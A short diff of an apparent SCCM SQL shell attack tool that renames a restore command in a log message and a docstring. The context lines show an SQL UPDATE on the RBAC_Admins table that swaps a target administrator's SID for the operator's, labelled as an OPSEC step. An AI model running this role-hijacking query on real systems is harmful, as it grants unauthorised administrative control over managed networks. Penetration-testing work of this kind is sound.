@@ -763,7 +763,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
         sid_enc_you = self.user_to_sid(your_user)
         sid_enc_target = self.user_to_sid(target_user)
         logging.info(f"OPSEC: You have overwritten the SID of the target user.")
-        logging.info(f"Restore command: sccm_restore_targeted {sid_enc_target} {target_user}")
+        logging.info(f"Restore command: sccm_restore_targ {sid_enc_target} {target_user}")
 
         query = f"UPDATE RBAC_Admins SET AdminSID = {sid_enc_you} WHERE AdminSID = {sid_enc_target}"
         self.__run(query)
@@ -788,7 +788,7 @@ class SCCM_SQLSHELL(cmd.Cmd):
         self.__run(query)
     
     """
-    sccm_restore_targeted [SID_encoded] [target_user]   - Restore target user's SID to the one specified
+    sccm_restore_targ [SID_encoded] [target_user]   - Restore target user's SID to the one specified
     """
     def do_sccm_restore_targ(self, arg=""):
         split_arg = arg.split()
